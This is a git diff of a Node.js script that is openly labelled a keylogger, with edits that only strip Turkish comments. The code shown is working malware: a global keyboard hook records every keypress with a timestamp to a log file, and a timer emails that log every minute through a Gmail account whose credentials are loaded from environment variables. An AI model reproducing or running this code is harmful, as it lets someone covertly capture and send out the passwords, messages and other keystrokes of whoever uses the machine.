@@ -1,31 +1,31 @@
-require("dotenv").config();  // .env dosyasını yükle
+require("dotenv").config();  
 const { GlobalKeyboardListener } = require("node-global-key-listener");
 const fs = require("fs");
 const nodemailer = require("nodemailer");
 
 const logFile = "logs.txt";
-const emailInterval = 60000; // 60 saniyede bir e-posta ile gönder
+const emailInterval = 60000; 
 
 const vKey = new GlobalKeyboardListener();
 
-// 📌 Gmail için transporter (Artık şifre kod içinde görünmüyor!)
+
 const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-        user: process.env.EMAIL_USER,  // .env dosyasından alıyor
-        pass: process.env.EMAIL_PASS   // Şifre artık kodda değil!
+        user: process.env.EMAIL_USER,  
+        pass: process.env.EMAIL_PASS   
     }
 });
 
 vKey.addListener((e) => {
-    if (e.state === "DOWN") {  // Tekrar etmeyi engelle
+    if (e.state === "DOWN") {  
         const logEntry = `${new Date().toISOString()} - Key: ${e.name}\n`;
         fs.appendFileSync(logFile, logEntry);
         console.log(logEntry);
     }
 });
 
-// 📌 Logları belirli aralıklarla e-posta ile gönder
+
 function sendEmailLogs() {
     if (fs.existsSync(logFile)) {
         const logData = fs.readFileSync(logFile, "utf8");
@@ -48,7 +48,7 @@ function sendEmailLogs() {
     }
 }
 
-// 📌 Belirli aralıklarla logları gönder
+
 setInterval(sendEmailLogs, emailInterval);
 
 console.log("🎯 Keylogger çalışıyor... Loglar e-posta ile gönderilecek.");
